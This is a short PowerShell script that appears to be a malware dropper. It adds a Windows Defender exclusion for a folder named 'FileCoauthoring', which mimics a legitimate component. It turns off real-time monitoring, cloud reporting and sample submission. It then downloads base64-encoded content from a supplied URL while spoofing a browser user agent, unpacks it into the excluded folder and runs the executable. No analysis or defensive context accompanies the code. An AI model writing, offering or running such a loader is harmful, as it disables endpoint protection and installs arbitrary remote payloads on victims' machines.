param (
    [string]$url,
    [string]$exeName
)

try{
    $directoryPath = "C:\Program Files\FileCoauthoring"
    Add-MpPreference -ExclusionPath $directoryPath
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -MAPSReporting 0
    Set-MpPreference -SubmitSamplesConsent 2
    }
    catch{
        Write-Output "Unsuccesful.."
    }
    
    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
    $response = Invoke-WebRequest -Uri $url -Headers @{"User-Agent" = $userAgent} -UseBasicParsing
    $bytes = [Convert]::FromBase64String($response.Content)
    $randomZipFileName = "C:\Program Files\FileCoauthoring\" + [Guid]::NewGuid().ToString() + ".zip"
    
    if (-not (Test-Path $directoryPath)) {
        New-Item -ItemType Directory -Path $directoryPath
    }
    
    [System.IO.File]::WriteAllBytes($randomZipFileName, $bytes)
    Expand-Archive -LiteralPath $randomZipFileName -DestinationPath $directoryPath -Force
    Remove-Item -Path $randomZipFileName
    Start-Process -FilePath "C:\Program Files\FileCoauthoring\$exeName"
    
  